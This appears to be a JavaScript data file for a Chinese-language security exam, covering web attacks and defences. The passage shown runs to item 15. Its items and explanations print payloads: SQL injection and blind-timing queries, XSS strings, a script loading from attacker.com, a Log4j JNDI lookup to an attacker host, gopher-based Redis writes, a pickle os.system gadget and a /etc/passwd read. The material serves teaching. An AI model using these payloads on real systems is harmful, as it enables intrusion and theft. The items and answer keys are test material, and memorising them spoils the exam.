window.EXAM_DATA = {
  "meta": {
    "title": "資安實戰模擬試題與錯題筆記系統",
    "version": "1.0",
    "updated": "2026-09-28",
    "counts": {
      "exam_a": 100,
      "exam_b": 93,
      "total": 193
    },
    "domains_a": [
      "領域一：Web 應用安全與 OWASP Top 10",
      "領域二：密碼學與身份驗證機制",
      "領域三：網路協議分析與封包取證",
      "領域四：系統安全加固、Linux/Windows 權限與配置",
      "領域五：逆向工程、惡意程式與二進位安全",
      "領域六：資安法規、標準與治理體系",
      "領域七：資安事件應變與數位鑑識"
    ],
    "domains_b": [
      "第一部分：IR 事件應變與記憶體取證演練",
      "第二部分：系統安全加固實務演練",
      "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "第四部分：CTF II 實戰靶機渗透與權限提升演練"
    ]
  },
  "exam_a": [
    {
      "id": 1,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / SQL注入",
      "type": "single_choice",
      "question": "某管理員在審計 Web 伺服器訪問日誌時，發現以下請求參數：  \n\n`id=1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--+`  \n\n此攻擊手法主要依賴何種特性來獲取非預期的資料庫結構？",
      "options": {
        "A": "利用不同資料庫類型的字串串接語法差異",
        "B": "利用 UNION 運算子要求前後查詢欄位數與型態相容之特性，拼湊跨表讀取",
        "C": "觸發資料庫底層核心崩潰以洩漏記憶體頁面",
        "D": "利用時間盲注中的 SLEEP() 函數測量伺服器延遲"
      },
      "answer": "B",
      "basis": "SQL UNION 注入的必要條件是前後兩次 `SELECT` 查詢返回的欄位數量必須完全一致，且對應位置的欄位資料型態必須相容。攻擊者利用這一點，藉由聯合查詢將資料庫元資料字典（`information_schema`）中的敏感資訊拼接到原始正常查詢的結果集中輸出。",
      "distractor": "- (A) 字串串接在不同資料庫（MySQL `CONCAT`、Oracle `||`、SQL Server `+`）確實有差異，但不是 UNION 注入的核心機制。\n\n  - (C) 報錯注入（如 `updatexml`）才是利用函數引發錯誤，UNION 不會引發核心崩潰。\n\n  - (D) `SLEEP()` 是時間盲注的手法，本題為聯合查詢注入。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：SQL UNION 注入的必要條件是前後兩次 `SELECT` 查詢返回的欄位數量必須完全一致，且對應位置的欄位資料型態必須相容。攻擊者利用這一點，藉由聯合查詢將資料庫元資料字典（`information_schema`）中的敏感資訊拼接到原始正常查詢的結果集中輸出。\n\n- **干擾項辨析**：\n\n  - (A) 字串串接在不同資料庫（MySQL `CONCAT`、Oracle `||`、SQL Server `+`）確實有差異，但不是 UNION 注入的核心機制。\n\n  - (C) 報錯注入（如 `updatexml`）才是利用函數引發錯誤，UNION 不會引發核心崩潰。\n\n  - (D) `SLEEP()` 是時間盲注的手法，本題為聯合查詢注入。"
    },
    {
      "id": 2,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / SQL盲注",
      "type": "single_choice",
      "question": "在無任何報錯與回顯內容的盲注環境中，攻擊者常利用條件表達式配合延遲函數來探測資料。下列哪一個 SQL 語句在 MySQL 環境下能成功達成「若資料庫名稱第一個字元 ASCII 碼為 115 則延遲 5 秒」之目的？",
      "options": {
        "A": "`SELECT IF(ascii(substr(database(),1,1))=115, sleep(5), 0);`",
        "B": "`SELECT WAITFOR DELAY '0:0:5' WHERE ascii(substr(database(),1,1))=115;`",
        "C": "`SELECT CASE WHEN substr(database(),1,1)='s' THEN pg_sleep(5) END;`",
        "D": "`SELECT BENCHMARK(5000000, MD5(1)) WHERE database() LIKE 's%';`"
      },
      "answer": "A",
      "basis": "在 MySQL 中，`IF(condition, true_action, false_action)` 配合 `sleep(N)` 是最標準的時間盲注表達式。`ascii(substr(database(),1,1))=115` 判斷資料庫名稱第 1 個字元的 ASCII 碼是否為 115（字母 's'）。若條件成立，則執行 `sleep(5)` 使 HTTP 響應時間延遲 5 秒。",
      "distractor": "- (B) `WAITFOR DELAY` 是 Microsoft SQL Server 的專用語法，非 MySQL。\n\n  - (C) `pg_sleep()` 是 PostgreSQL 的專用語法。\n\n  - (D) `BENCHMARK()` 雖然在早期 MySQL 用於耗時運算，但無法直接配合 `WHERE` 子句達成精確的條件時間盲注。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 MySQL 中，`IF(condition, true_action, false_action)` 配合 `sleep(N)` 是最標準的時間盲注表達式。`ascii(substr(database(),1,1))=115` 判斷資料庫名稱第 1 個字元的 ASCII 碼是否為 115（字母 's'）。若條件成立，則執行 `sleep(5)` 使 HTTP 響應時間延遲 5 秒。\n\n- **干擾項辨析**：\n\n  - (B) `WAITFOR DELAY` 是 Microsoft SQL Server 的專用語法，非 MySQL。\n\n  - (C) `pg_sleep()` 是 PostgreSQL 的專用語法。\n\n  - (D) `BENCHMARK()` 雖然在早期 MySQL 用於耗時運算，但無法直接配合 `WHERE` 子句達成精確的條件時間盲注。"
    },
    {
      "id": 3,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 跨站腳本 XSS",
      "type": "single_choice",
      "question": "某網頁在顯示使用者個人暱稱時，未做任何過濾或編碼即直接輸出至 HTML 屬性中：`<input type=\"text\" name=\"nickname\" value=\"$userInput\">`。若攻擊者輸入以下哪一組 Payload，能以最短長度且不依賴 `<script>` 標籤觸發 JavaScript 執行？",
      "options": {
        "A": "`\" onfocus=\"alert(1)\" autofocus=\"`",
        "B": "`<script>alert(1)</script>`",
        "C": "`javascript:alert(1)`",
        "D": "`&quot; onclick=&quot;alert(1)&quot;`"
      },
      "answer": "A",
      "basis": "當使用者輸入直接拼接在 HTML 屬性內時，最有效率且能自動觸發的 Payload 是利用屬性閉合加上自動聚焦事件：`\" onfocus=\"alert(1)\" autofocus=\"`。當瀏覽器載入該 `<input>` 時，`autofocus` 會自動使該輸入框獲得焦點，進而立即觸發 `onfocus` 事件執行 JavaScript，無須使用者手動點擊。",
      "distractor": "- (B) `<script>` 在屬性值內不會被解析為標籤，除非能成功閉合 `<input>` 標籤，但長度較長且容易被 WAF 攔截。\n\n  - (C) `javascript:alert(1)` 只能用在 `href` 或 `src` 等 URL 屬性中，在 `value` 屬性中只是純文字。\n\n  - (D) 實體編碼不會主動觸發執行。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：當使用者輸入直接拼接在 HTML 屬性內時，最有效率且能自動觸發的 Payload 是利用屬性閉合加上自動聚焦事件：`\" onfocus=\"alert(1)\" autofocus=\"`。當瀏覽器載入該 `<input>` 時，`autofocus` 會自動使該輸入框獲得焦點，進而立即觸發 `onfocus` 事件執行 JavaScript，無須使用者手動點擊。\n\n- **干擾項辨析**：\n\n  - (B) `<script>` 在屬性值內不會被解析為標籤，除非能成功閉合 `<input>` 標籤，但長度較長且容易被 WAF 攔截。\n\n  - (C) `javascript:alert(1)` 只能用在 `href` 或 `src` 等 URL 屬性中，在 `value` 屬性中只是純文字。\n\n  - (D) 實體編碼不會主動觸發執行。"
    },
    {
      "id": 4,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / XSS 防護機制",
      "type": "single_choice",
      "question": "現代瀏覽器普遍支援內容安全策略（Content Security Policy, CSP）。若某網站設定 HTTP 標頭：  \n\n`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m';`  \n\n攻擊者在 HTML 中成功注入以下哪段代碼時，**依然會被瀏覽器強制攔截而無法執行**？",
      "options": {
        "A": "`<script nonce=\"r4nd0m\">console.log(\"Safe\");</script>`",
        "B": "`<script src=\"https://attacker.com/evil.js\"></script>`",
        "C": "`<script nonce=\"r4nd0m\" src=\"/static/js/app.js\"></script>`",
        "D": "`<script nonce=\"r4nd0m\">fetch('/api/user');</script>`"
      },
      "answer": "B",
      "basis": "CSP 規則設定了 `script-src 'self' 'nonce-r4nd0m'`，這意味著所有 `<script>` 標籤必須攜帶與伺服器一致的隨機數 `nonce=\"r4nd0m\"`，或者來源為同源 `'self'`。選項 (B) 嘗試載入外部惡意網域 `https://attacker.com/evil.js`，既不是同源（非 'self'），又沒有攜帶合法的 `nonce`，因此會被瀏覽器強制阻擋。",
      "distractor": "- (A)、(C)、(D) 均攜帶了合法的 `nonce=\"r4nd0m\"`，符合 CSP 策略允許執行。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：CSP 規則設定了 `script-src 'self' 'nonce-r4nd0m'`，這意味著所有 `<script>` 標籤必須攜帶與伺服器一致的隨機數 `nonce=\"r4nd0m\"`，或者來源為同源 `'self'`。選項 (B) 嘗試載入外部惡意網域 `https://attacker.com/evil.js`，既不是同源（非 'self'），又沒有攜帶合法的 `nonce`，因此會被瀏覽器強制阻擋。\n\n- **干擾項辨析**：\n\n  - (A)、(C)、(D) 均攜帶了合法的 `nonce=\"r4nd0m\"`，符合 CSP 策略允許執行。"
    },
    {
      "id": 5,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 伺服器端請求偽造 SSRF",
      "type": "single_choice",
      "question": "在進行 SSRF 漏洞利用時，若目標後端採用 `curl` 且支援多種協定，攻擊者常藉由哪一種協定直接向內網未授權的 Redis 伺服器發送多行 RESP 指令，進而寫入 WebShell 或 SSH 公鑰？",
      "options": {
        "A": "`dict://`",
        "B": "`gopher://`",
        "C": "`ldap://`",
        "D": "`tftp://`"
      },
      "answer": "B",
      "basis": "Gopher 協定（`gopher://`）是 SSRF 中最強大的攻擊武器，因其支援自訂傳輸任意位元組流（包括換行符 `\\r\\n`）。攻擊者可構造符合 Redis RESP 協定的多行指令（如 `set dir /var/spool/cron`、`set dbfilename root` 等），透過 SSRF 向內網 Redis 注入排程任務或 WebShell。",
      "distractor": "- (A) `dict://` 協定只能發送單行指令或查詢，無法發送包含多行換行符號的複雜協定指令。\n\n  - (C) LDAP 用於目錄查詢，非用於向 Redis 寫入檔案。\n\n  - (D) TFTP 是基於 UDP 的簡易檔案傳輸協定，curl SSRF 通常不支援複雜交握。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Gopher 協定（`gopher://`）是 SSRF 中最強大的攻擊武器，因其支援自訂傳輸任意位元組流（包括換行符 `\\r\\n`）。攻擊者可構造符合 Redis RESP 協定的多行指令（如 `set dir /var/spool/cron`、`set dbfilename root` 等），透過 SSRF 向內網 Redis 注入排程任務或 WebShell。\n\n- **干擾項辨析**：\n\n  - (A) `dict://` 協定只能發送單行指令或查詢，無法發送包含多行換行符號的複雜協定指令。\n\n  - (C) LDAP 用於目錄查詢，非用於向 Redis 寫入檔案。\n\n  - (D) TFTP 是基於 UDP 的簡易檔案傳輸協定，curl SSRF 通常不支援複雜交握。"
    },
    {
      "id": 6,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / DNS Rebinding",
      "type": "single_choice",
      "question": "針對 SSRF 防禦中的「IP 黑名單校驗」（如檢查是否解析為 127.0.0.1 或 192.168.x.x），攻擊者常採用 DNS Rebinding 技術繞過。其核心原理為何？",
      "options": {
        "A": "偽造 ARP 回應使伺服器將網關指向攻擊者 IP",
        "B": "利用極短的 DNS TTL，使後端在校驗 IP 時解析為公網合法 IP，隨後發起業務請求時解析為內網私有 IP",
        "C": "利用 HTTP 重定向 302 跳轉至私有 IP",
        "D": "在 Host 標頭中注入換行字元 CRLF 竄改請求目的地"
      },
      "answer": "B",
      "basis": "DNS Rebinding 攻擊建立在攻擊者控制的權威 DNS 伺服器上，將 DNS 記錄的 TTL 設為極短（如 0 秒）。當 Web 伺服器第一次進行安全檢查時，DNS 解析出合法的公網 IP（檢查通過）；緊接著伺服器實際發起 HTTP 請求時進行第二次 DNS 解析，此時攻擊者的 DNS 伺服器改為回傳內網私有 IP（如 `127.0.0.1` 或 `192.168.1.1`），從而完美繞過黑名單檢查。",
      "distractor": "- (A) ARP 欺騙需要位於同一區域網路，遠端 SSRF 無法發送 ARP 封包。\n\n  - (C) 若應用程式開啟跟隨重定向且未對 302 目標進行檢查，也可以繞過，但這不是 DNS Rebinding 的原理。\n\n  - (D) CRLF 注入是 HTTP 標頭拆分攻擊，與 DNS 解析無關。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：DNS Rebinding 攻擊建立在攻擊者控制的權威 DNS 伺服器上，將 DNS 記錄的 TTL 設為極短（如 0 秒）。當 Web 伺服器第一次進行安全檢查時，DNS 解析出合法的公網 IP（檢查通過）；緊接著伺服器實際發起 HTTP 請求時進行第二次 DNS 解析，此時攻擊者的 DNS 伺服器改為回傳內網私有 IP（如 `127.0.0.1` 或 `192.168.1.1`），從而完美繞過黑名單檢查。\n\n- **干擾項辨析**：\n\n  - (A) ARP 欺騙需要位於同一區域網路，遠端 SSRF 無法發送 ARP 封包。\n\n  - (C) 若應用程式開啟跟隨重定向且未對 302 目標進行檢查，也可以繞過，但這不是 DNS Rebinding 的原理。\n\n  - (D) CRLF 注入是 HTTP 標頭拆分攻擊，與 DNS 解析無關。"
    },
    {
      "id": 7,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 命令注入",
      "type": "single_choice",
      "question": "在 Linux 環境下的 Web 應用中，若參數直接拼接進 `system()` 函數，但系統過濾了「空格字元」，下列哪一個字元替換方案**無法**在 bash 環境下替代空格以維持命令語法完整？",
      "options": {
        "A": "`${IFS}`",
        "B": "`$IFS$9`",
        "C": "`<`（如 `cat</etc/passwd`）",
        "D": "`%20`（未經 URL 解碼直接傳入命令列時）"
      },
      "answer": "D",
      "basis": "當參數傳入 Linux 底層的 `system()` 或 `execve()` 執行時，若未經過 URL 解碼，字串 `%20` 會被當作三個普通的 ASCII 字元（`%`、`2`、`0`），導致命令語法解析錯誤，無法替代空格。",
      "distractor": "- (A) `${IFS}` 是 Linux 內部欄位分隔符，預設包含空格、Tab 與換行，可成功替代空格。\n\n  - (B) `$IFS$9` 中 `$9` 為第 9 個位置參數（通常為空），連同 `$IFS` 能形成天然分隔且防止與後續變數名稱黏連。\n\n  - (C) 重定向符號 `<` 在 shell 中可直接連接命令與檔名，如 `cat</etc/passwd`，語法完全合法。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：當參數傳入 Linux 底層的 `system()` 或 `execve()` 執行時，若未經過 URL 解碼，字串 `%20` 會被當作三個普通的 ASCII 字元（`%`、`2`、`0`），導致命令語法解析錯誤，無法替代空格。\n\n- **干擾項辨析**：\n\n  - (A) `${IFS}` 是 Linux 內部欄位分隔符，預設包含空格、Tab 與換行，可成功替代空格。\n\n  - (B) `$IFS$9` 中 `$9` 為第 9 個位置參數（通常為空），連同 `$IFS` 能形成天然分隔且防止與後續變數名稱黏連。\n\n  - (C) 重定向符號 `<` 在 shell 中可直接連接命令與檔名，如 `cat</etc/passwd`，語法完全合法。"
    },
    {
      "id": 8,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / PHP反序列化",
      "type": "single_choice",
      "question": "在 PHP 物件導向中，當一個物件被銷毀或腳本執行完畢時，會自動觸發的魔術方法（Magic Method）為何？",
      "options": {
        "A": "`__wakeup()`",
        "B": "`__destruct()`",
        "C": "`__toString()`",
        "D": "`__invoke()`"
      },
      "answer": "B",
      "basis": "PHP 物件導向中，`__destruct()` 是解構函數（Destructor），在物件的所有引用都被刪除、或者物件被明確銷毀、或腳本執行完畢時自動被呼叫。在反序列化利用鏈（POP Chain）中，`__destruct()` 常常作為攻擊觸發的起點（Source）。",
      "distractor": "- (A) `__wakeup()` 是在物件被 `unserialize()` 反序列化成功時立即被呼叫。\n\n  - (C) `__toString()` 是在物件被當作字串使用時（如 `echo $obj`）觸發。\n\n  - (D) `__invoke()` 是在把物件當作函數調用時（如 `$obj()`）觸發。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：PHP 物件導向中，`__destruct()` 是解構函數（Destructor），在物件的所有引用都被刪除、或者物件被明確銷毀、或腳本執行完畢時自動被呼叫。在反序列化利用鏈（POP Chain）中，`__destruct()` 常常作為攻擊觸發的起點（Source）。\n\n- **干擾項辨析**：\n\n  - (A) `__wakeup()` 是在物件被 `unserialize()` 反序列化成功時立即被呼叫。\n\n  - (C) `__toString()` 是在物件被當作字串使用時（如 `echo $obj`）觸發。\n\n  - (D) `__invoke()` 是在把物件當作函數調用時（如 `$obj()`）觸發。"
    },
    {
      "id": 9,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / Python反序列化",
      "type": "single_choice",
      "question": "Python 的 `pickle` 模組在進行反序列化（`pickle.loads`）時存在嚴重安全風險。攻擊者通常透過自訂類別中的哪一個魔術方法來定義反序列化時執行的任意系統命令？",
      "options": {
        "A": "`__reduce__()`",
        "B": "`__init__()`",
        "C": "`__call__()`",
        "D": "`__getattr__()`"
      },
      "answer": "A",
      "basis": "Python 的 `pickle` 模組在反序列化自訂物件時，會檢查該類別是否定義了 `__reduce__()` 魔術方法。若定義了該方法，其必須回傳一個元組 `(callable, args)`。反序列化引擎會直接呼叫該 `callable(*args)`。攻擊者可令其回傳 `(os.system, ('cat /flag',))`，反序列化時立即執行系統命令。",
      "distractor": "- (B) `__init__()` 在 `pickle.loads()` 預設情況下甚至不會被呼叫。\n\n  - (C) `__call__()` 是物件被當成函數執行時觸發。\n\n  - (D) `__getattr__()` 是存取不存在的屬性時觸發。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Python 的 `pickle` 模組在反序列化自訂物件時，會檢查該類別是否定義了 `__reduce__()` 魔術方法。若定義了該方法，其必須回傳一個元組 `(callable, args)`。反序列化引擎會直接呼叫該 `callable(*args)`。攻擊者可令其回傳 `(os.system, ('cat /flag',))`，反序列化時立即執行系統命令。\n\n- **干擾項辨析**：\n\n  - (B) `__init__()` 在 `pickle.loads()` 預設情況下甚至不會被呼叫。\n\n  - (C) `__call__()` 是物件被當成函數執行時觸發。\n\n  - (D) `__getattr__()` 是存取不存在的屬性時觸發。"
    },
    {
      "id": 10,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / Java反序列化與JNDI",
      "type": "single_choice",
      "question": "在 Log4j2 遠端代碼執行漏洞（CVE-2021-44228）中，攻擊者構造的 lookup 語法 `${jndi:ldap://attacker.com/Exploit}` 能導致遠端類別載入執行的根本原因為何？",
      "options": {
        "A": "Log4j 預設解析日誌時啟用 JNDI 查詢，且在特定版本未對 LDAP/RMI 回傳的 codebase 與物件序列化內容進行反序列化限制",
        "B": "Log4j 使用了有漏洞的 XML 解析器導致 XXE 實體注入",
        "C": "Log4j 寫入檔案時觸發了緩衝區溢位",
        "D": "攻擊者可藉由 JNDI 繞過作業系統的 root 權限檢查"
      },
      "answer": "A",
      "basis": "Log4j2 的核心設計允許在日誌訊息中使用 `${...}` 語法進行動態變數查找（Lookup）。當解析到 `${jndi:ldap://...}` 時，Log4j 會主動透過 JNDI 向攻擊者指定的 LDAP 伺服器發起查詢。攻擊者控制的 LDAP 伺服器回傳一個帶有遠端 Codebase（惡意 class 檔案 URL）的 Reference 物件，Log4j 底層在反序列化與載入時自動從遠端下載並執行該 class 中的靜態程式碼塊，造成未授權遠端代碼執行（RCE）。",
      "distractor": "- (B) Log4j RCE 不是 XXE 漏洞。\n\n  - (C) Log4j RCE 是 Java 邏輯反序列化漏洞，不是 C/C++ 的緩衝區溢位。\n\n  - (D) JNDI 只是 Java 層級的機制，無法直接繞過作業系統核心的權限模型。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Log4j2 的核心設計允許在日誌訊息中使用 `${...}` 語法進行動態變數查找（Lookup）。當解析到 `${jndi:ldap://...}` 時，Log4j 會主動透過 JNDI 向攻擊者指定的 LDAP 伺服器發起查詢。攻擊者控制的 LDAP 伺服器回傳一個帶有遠端 Codebase（惡意 class 檔案 URL）的 Reference 物件，Log4j 底層在反序列化與載入時自動從遠端下載並執行該 class 中的靜態程式碼塊，造成未授權遠端代碼執行（RCE）。\n\n- **干擾項辨析**：\n\n  - (B) Log4j RCE 不是 XXE 漏洞。\n\n  - (C) Log4j RCE 是 Java 邏輯反序列化漏洞，不是 C/C++ 的緩衝區溢位。\n\n  - (D) JNDI 只是 Java 層級的機制，無法直接繞過作業系統核心的權限模型。"
    },
    {
      "id": 11,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / CSRF 與 Cookie 屬性",
      "type": "single_choice",
      "question": "為防範跨站請求偽造（CSRF），現代瀏覽器為 Cookie 引入了 `SameSite` 屬性。當 Cookie 設定為 `SameSite=Lax` 時，下列哪一種情境**會**攜帶此 Cookie 發送請求？",
      "options": {
        "A": "第三方網站透過 `<iframe>` 嵌入目標網站發起的 POST 請求",
        "B": "第三方網站使用 JavaScript `fetch()` 發起的跨域 POST 請求",
        "C": "使用者在第三方網站點擊一般 `<a href=\"...\">` 頂層導覽連結至目標網站的 GET 請求",
        "D": "第三方網站透過 `<form method=\"POST\">` 自動提交至目標網站"
      },
      "answer": "C",
      "basis": "`SameSite=Lax` 是一種折衷的安全模式。它允許在「安全且為頂層導覽（Top-level Navigation）」的跨站請求中攜帶 Cookie，例如使用者在第三方網頁點擊 `<a href=\"...\">` 連結進入目標網站的 GET 請求。但任何跨站的 POST、PUT、DELETE 請求或由 `<iframe>`、`<script>`、`<img>` 發起的非頂層請求，均不會攜帶 Lax Cookie。",
      "distractor": "- (A)、(B)、(D) 均為跨站發起的 POST 請求或嵌入式請求，`SameSite=Lax` 嚴格禁止攜帶 Cookie，從而有效防禦傳統 CSRF 表單攻擊。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：`SameSite=Lax` 是一種折衷的安全模式。它允許在「安全且為頂層導覽（Top-level Navigation）」的跨站請求中攜帶 Cookie，例如使用者在第三方網頁點擊 `<a href=\"...\">` 連結進入目標網站的 GET 請求。但任何跨站的 POST、PUT、DELETE 請求或由 `<iframe>`、`<script>`、`<img>` 發起的非頂層請求，均不會攜帶 Lax Cookie。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(D) 均為跨站發起的 POST 請求或嵌入式請求，`SameSite=Lax` 嚴格禁止攜帶 Cookie，從而有效防禦傳統 CSRF 表單攻擊。"
    },
    {
      "id": 12,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / CORS 配置錯誤",
      "type": "single_choice",
      "question": "若某 Web API 伺服器在響應 HTTP 請求時回傳以下標頭：  \n\n`Access-Control-Allow-Origin: https://malicious.com`  \n\n`Access-Control-Allow-Credentials: true`  \n\n此配置帶來的安全威脅為何？",
      "options": {
        "A": "攻擊者無法讀取響應，因為 CORS 只保護發送方",
        "B": "攻擊者網站能透過前端腳本向目標 API 發起帶有使用者身分憑證（如 Cookie）的請求，並完整讀取敏感響應內容",
        "C": "目標伺服器會強制被注入惡意 JavaScript 腳本",
        "D": "攻擊者可以取得該 API 伺服器的 SSH root 連線"
      },
      "answer": "B",
      "basis": "CORS 機制中，當伺服器明確指定 `Access-Control-Allow-Origin: https://malicious.com` 且 `Access-Control-Allow-Credentials: true` 時，瀏覽器會允許來自 `malicious.com` 的前端腳本使用 `fetch()` 或 `XMLHttpRequest` 發起帶有目標網站 Cookie/憑證的請求，並且允許該惡意腳本讀取回傳的 HTTP 響應內容（如使用者個資、敏感 API 回應）。",
      "distractor": "- (A) 錯誤，CORS 設定寬鬆正是讓攻擊者能跨域讀取敏感資料。\n\n  - (C) CORS 配置錯誤不會向伺服器注入腳本，威脅在於跨域資訊洩漏。\n\n  - (D) 與 SSH root 權限完全無關。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：CORS 機制中，當伺服器明確指定 `Access-Control-Allow-Origin: https://malicious.com` 且 `Access-Control-Allow-Credentials: true` 時，瀏覽器會允許來自 `malicious.com` 的前端腳本使用 `fetch()` 或 `XMLHttpRequest` 發起帶有目標網站 Cookie/憑證的請求，並且允許該惡意腳本讀取回傳的 HTTP 響應內容（如使用者個資、敏感 API 回應）。\n\n- **干擾項辨析**：\n\n  - (A) 錯誤，CORS 設定寬鬆正是讓攻擊者能跨域讀取敏感資料。\n\n  - (C) CORS 配置錯誤不會向伺服器注入腳本，威脅在於跨域資訊洩漏。\n\n  - (D) 與 SSH root 權限完全無關。"
    },
    {
      "id": 13,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 檔案上傳解析漏洞",
      "type": "single_choice",
      "question": "在 Apache HTTP Server 2.4.x 之前的特定版本中，若管理員設定 `AddHandler php5-script .php`，當攻擊者上傳名為 `shell.php.jpg` 的檔案時，伺服器可能將其當作 PHP 腳本執行。此特性的根源為何？",
      "options": {
        "A": "MIME 類型檢測混淆",
        "B": "Apache 從右至左解析副檔名，遇到未定義之 `.jpg` 繼續往左識別出 `.php` 並交由 PHP 解釋器處理",
        "C": "檔案上傳時檔名末尾自動被截斷 `%00`",
        "D": "圖片檔案的 EXIF 資訊被強制解析為二進位碼"
      },
      "answer": "B",
      "basis": "在舊版 Apache 中，使用 `AddHandler` 關聯副檔名時，Apache 解析副檔名採取「從右至左」的機制。若遇到未定義 MIME 類型的副檔名（如自訂的 `.jpg`），Apache 會繼續往左檢查，一旦辨識出 `.php`，便會觸發 PHP 處理程序執行該檔案。加固方法應使用 `<FilesMatch \\.php$>` 配合 `SetHandler`。",
      "distractor": "- (A) MIME 類型檢測混淆通常由後端程式代碼造成，非 Apache 核心機制。\n\n  - (C) `%00` 截斷需要 PHP 5.3.4 以前版本且 Magic Quotes 關閉，非 Apache 多副檔名特性。\n\n  - (D) EXIF 資訊本身不是二進位執行代碼。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在舊版 Apache 中，使用 `AddHandler` 關聯副檔名時，Apache 解析副檔名採取「從右至左」的機制。若遇到未定義 MIME 類型的副檔名（如自訂的 `.jpg`），Apache 會繼續往左檢查，一旦辨識出 `.php`，便會觸發 PHP 處理程序執行該檔案。加固方法應使用 `<FilesMatch \\.php$>` 配合 `SetHandler`。\n\n- **干擾項辨析**：\n\n  - (A) MIME 類型檢測混淆通常由後端程式代碼造成，非 Apache 核心機制。\n\n  - (C) `%00` 截斷需要 PHP 5.3.4 以前版本且 Magic Quotes 關閉，非 Apache 多副檔名特性。\n\n  - (D) EXIF 資訊本身不是二進位執行代碼。"
    },
    {
      "id": 14,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / Nginx 目錄穿越配置",
      "type": "single_choice",
      "question": "在 Nginx 配置中，下列哪一種 `location` 與 `alias` 的搭配方式會導致嚴重的目錄穿越（Directory Traversal）漏洞，使外部訪客能存取目標目錄上一層的檔案？",
      "options": {
        "A": "`location /static/ { alias /app/static/; }`",
        "B": "`location /files { alias /app/files/; }`",
        "C": "`location /images/ { root /app/data; }`",
        "D": "`location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; }`"
      },
      "answer": "B",
      "basis": "在 Nginx 配置中，若 `location /files` 末尾沒有加斜線 `/`，但其內的 `alias /app/files/` 有加斜線，當外部訪客請求 `GET /files../app.py` 時，Nginx 會將 `/files` 替換為 `/app/files/`，拼湊出 `/app/files/../app.py`，即 `/app/app.py`，從而使攻擊者能遍歷下載 `/app/` 目錄下的所有原始碼。",
      "distractor": "- (A) 前後均有斜線 `/static/` 與 `/app/static/`，為規範安全配置。\n\n  - (C) `root` 指令採用路徑拼接，不存在 alias 的目錄穿越漏洞。\n\n  - (D) 正規匹配轉發 FastCGI，無路徑穿越問題。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 Nginx 配置中，若 `location /files` 末尾沒有加斜線 `/`，但其內的 `alias /app/files/` 有加斜線，當外部訪客請求 `GET /files../app.py` 時，Nginx 會將 `/files` 替換為 `/app/files/`，拼湊出 `/app/files/../app.py`，即 `/app/app.py`，從而使攻擊者能遍歷下載 `/app/` 目錄下的所有原始碼。\n\n- **干擾項辨析**：\n\n  - (A) 前後均有斜線 `/static/` 與 `/app/static/`，為規範安全配置。\n\n  - (C) `root` 指令採用路徑拼接，不存在 alias 的目錄穿越漏洞。\n\n  - (D) 正規匹配轉發 FastCGI，無路徑穿越問題。"
    },
    {
      "id": 15,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / JWT 安全性",
      "type": "single_choice",
      "question": "JSON Web Token (JWT) 由 Header、Payload、Signature 三部分組成。在歷史漏洞中，攻擊者常利用「None 演算法攻擊」。該攻擊成功的前提條件為何？",
      "options": {
        "A": "伺服器將 Header 中的 `\"alg\": \"none\"` 視為合法，且驗證簽章邏輯跳過了簽名核對",
        "B": "密鑰長度小於 128 位元",
        "C": "Payload 未使用 Base64 進行編碼",
        "D": "簽章中使用公鑰代替私鑰進行驗證"
      },
      "answer": "A",
      "basis": "JWT 規範中包含一個特殊的無簽名演算法 `\"alg\": \"none\"`。早期許多存在漏洞的 JWT 驗證函式庫在收到 `\"alg\": \"none\"` 時，若邏輯寫成「若演算法為 none 則直接返回驗證成功」，攻擊者便可將簽名部分（Signature）完全留空，任意竄改 Payload 中的使用者身分（如將 `\"role\": \"user\"` 改為 `\"admin\"`）並通過驗證。",
      "distractor": "- (B) 密鑰長度不足會遭受暴力破解，但非 None 演算法漏洞的前提。\n\n  - (C) JWT 結構規定 Payload 必須使用 Base64URL 編碼。\n\n  - (D) 這是密鑰混淆攻擊（Key Confusion Attack），非 None 攻擊。",
